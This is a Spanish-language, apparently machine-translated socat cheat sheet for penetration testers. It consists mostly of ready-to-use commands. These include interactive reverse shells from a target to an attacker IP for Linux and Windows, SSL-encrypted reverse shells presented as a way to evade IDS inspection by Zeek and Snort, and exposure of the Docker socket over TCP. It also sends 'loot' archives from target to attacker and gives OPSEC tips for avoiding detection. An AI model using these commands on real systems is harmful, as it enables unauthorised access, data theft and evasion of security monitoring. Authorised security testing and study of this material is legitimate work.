<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p align="centro">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Explotación y Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protocolos">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licencia GPLv2">
</p>

<p align="centro">
  <b>🌐 Establezca dos flujos de bytes bidireccionales y transfiera datos entre archivos, tuberías, dispositivos, sockets y túneles SSL</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y arquitectura Socat] (#-descripción general--la-arquitectura-socat)
- [Comparación entre Socat y Netcat](#-comparación-socat-vs-netcat)
- [Instalación](#-instalación)
- [Shells inversos TTY totalmente interactivos](#-shells-tty-reverse-fully-interactive)
  - [Oyente atacante (TTY RAW)](#attacker-listener-raw-tty)
  - [Carga útil objetivo (generación de Pty)](#target-payload-pty-spawn)
  - [Shell inverso de destino de Windows](#windows-target-reverse-shell)
- [Shells inversos cifrados mediante SSL/TLS](#-shells-inversos-cifrados-via-ssltls)
  - [Generando Certificados](#generando-certificados)
  - [Oyente cifrado y conexión] (#escucha-cifrada--conexión)
- [Reenvío de puertos y retransmisiones de red](#-reenvío de puertos--retransmisiones de red)
  - [Reenvío de puerto local](#local-port-forwarding)
  - [Bifurcación de escucha (multicliente)] (#bifurcación-escucha-multicliente)
  - [Socket de dominio UNIX a retransmisión TCP (reenvío de Docker)] (#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [Transferencias de archivos con Socat](#-transferencias-de-archivos-con-socat)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y OPSEC](#-consideraciones-defensivas--opsec)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y la arquitectura de Socat

**Socat** (SOcket CAT) es una utilidad basada en línea de comandos que establece dos flujos de bytes bidireccionales y transfiere datos entre ellos. Debido a que los flujos pueden construirse a partir de un enorme conjunto de tipos de direcciones (archivos, canalizaciones, dispositivos, sockets TCP/UDP, SSL, IP sin procesar, SOCKS4, sockets de dominio UNIX), Socat a menudo se describe como Netcat con esteroides.

En pruebas de penetración y Red Teaming, Socat es legendario por dos superpoderes principales:
1. **Shells inversos TTY instantáneos totalmente interactivos:** Generación de pseudoterminales verdaderos (`pty`) con control de trabajo, teclas de flecha y autocompletado sin necesidad de gimnasia Python o `stty raw -echo`.
2. **Túneles de red SSL/TLS cifrados:** Eludiendo la inspección IDS estándar cifrando cargas de texto sin cifrar a través de SSL.

---

## ⚖️ Comparación de Socat y Netcat

| Característica | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|---------|--------------|-------------|-----------------|
| **Aparición de Shell PTY nativo** | ❌ No | ❌ No | ✅ Nativo (`pty,stderr,setsid`) |
| **Cifrado SSL/TLS** | ❌ No | ✅ Sí (`--ssl`) | ✅ Nativo (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Bifurcación de retransmisión multicliente**| ❌ No | ❌ No | ✅ Nativo (`fork,reuseaddr`) |
| **Sockets de dominio UNIX** | ❌ No | ✅ Limitado | ✅ Nativo (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Tamaño de archivo binario** | Mínimo (~40 KB) | Moderado (~500 KB) | Moderado (~400 KB independiente) |
| **Sintaxis del comando** | Banderas simples (`-lvnp`) | Basado en banderas (`-lvnp`) | Sintaxis de transmisión (`<type>:<args>`) |

---

## 📥 Instalación
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Shells inversos TTY totalmente interactivos

Cuando atrapas un shell inverso con Netcat estándar, recibes un shell tonto e inestable. Socat habilita un pseudoterminal 100% estable y totalmente interactivo con finalización de tabulación, manejo Ctrl+C y soporte para editor de pantalla (`vim`, `nano`).

### Oyente atacante (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!NOTA]
> `file:`tty`,raw,echo=0` pone su terminal local en modo sin formato y desactiva el eco de caracteres. Si la conexión se cierra inesperadamente y su terminal no responde, escriba `reset` y presione Enter.

### Carga útil objetivo (generación de Pty)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Desglose de opciones:
- `pty`: Asigna un pseudoterminal en el sistema de destino.
- `stderr`: Redirige el error estándar al socket.
- `setsid`: ejecuta el proceso en un nuevo grupo de sesión (evita la finalización cuando el padre sale).
- `sigint`: Pasa señales de interrupción (Ctrl+C) al proceso remoto en lugar de cerrar la sesión.
- `sane`: restablece la configuración de control del terminal a los valores predeterminados estándar.

### Shell inverso de destino de Windows
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Shells inversos cifrados mediante SSL/TLS

Evite que Network Security Monitoring (NSM), Zeek y Snort inspeccionen su carga útil de shell inverso cifrando el tráfico con un certificado SSL/TLS efímero.

### Generando certificados
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Oyente y conexión cifrados
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Reenvío de puertos y retransmisiones de red

Socat puede reenviar el tráfico entrante desde una interfaz o puerto de red directamente a un destino remoto diferente.

### Reenvío de puerto local
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Oyente de bifurcación (multicliente)

La opción `fork` permite a Socat generar un proceso hijo para cada nueva conexión entrante, manteniendo abierto el oyente principal:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### Socket de dominio UNIX a retransmisión TCP (reenvío de Docker)

Al acceder a un socket de demonio Docker local (`/var/run/docker.sock`) sin derechos de root en la red:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Transferencias de archivos con Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(El indicador `-u` especifica el modo unidireccional desde la primera dirección a la segunda).*

---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Oyente TTY interactivo** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Carga útil TTY interactiva** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Escucha SSL cifrada** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Carga útil SSL cifrada** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Reenvío de puertos (retransmisión)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Exponer el zócalo UNIX** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Transferencia de archivos (Receptor)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Transferencia de archivos (Remitente)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Consideraciones defensivas y OPSEC

1. **Cifrado de tráfico:** Los shells inversos de TCP de texto sin cifrar exponen comandos a IDS/IPS. Utilice siempre `OPENSSL-LISTEN` y `OPENSSL` durante los enfrentamientos del equipo rojo.
2. **Monitoreo de procesos:** Las plataformas Sysmon/EDR marcan comandos que invocan `pty,stderr,setsid` como una heurística de shell inversa inmediata.
3. **Binarios independientes:** Al implementar en sistemas de destino, utilice binarios Socat independientes compilados estáticamente para evitar dependencias de bibliotecas compartidas.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Esta hoja de referencia está destinada únicamente a pruebas de penetración, evaluaciones de seguridad e investigaciones académicas autorizadas. El acceso no autorizado a sistemas informáticos y la manipulación de redes son estrictamente ilegales.